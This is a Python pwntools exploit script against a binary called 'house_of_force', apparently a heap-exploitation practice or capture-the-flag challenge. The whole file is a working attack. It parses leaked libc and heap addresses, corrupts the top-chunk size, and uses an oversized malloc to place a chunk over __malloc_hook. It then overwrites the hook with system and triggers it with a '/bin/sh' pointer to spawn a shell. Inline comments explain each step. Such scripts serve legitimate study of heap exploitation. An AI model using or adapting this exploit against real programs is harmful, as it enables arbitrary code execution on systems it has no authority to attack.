#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_force")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def malloc(size, data):
    io.send("1")
    io.sendafter("malloc size: ", f"{size}")
    io.sendafter("malloc data: ", data)
    io.recvuntil("your option is: ")

def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil("your option is: ")
io.timeout = 0.1



log.info(f"heap: 0x{heap:02x}")
log.info(f"target: 0x{elf.sym.target:02x}")
malloc(24, b"Y"*24 + p64(0xffffffffffffffff))
# distance = delta(heap+0x20, elf.sym.target-0x20)

distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
malloc(distance, b"/bin/sh")

# overwrite the malloc_hook with system 
malloc(24, p64(libc.sym.system))

# here the cmd is the address of "/bin/sh", a.k.a a pointer to a string 
cmd = heap + 0x30

# every time invoking the malloc, 
# the __malloc_hook (which was overwriten with system) will be invoked,
# and the parameters would be passed to there as well (e.g. a pointer) 
malloc(cmd, 'a')

io.interactive()
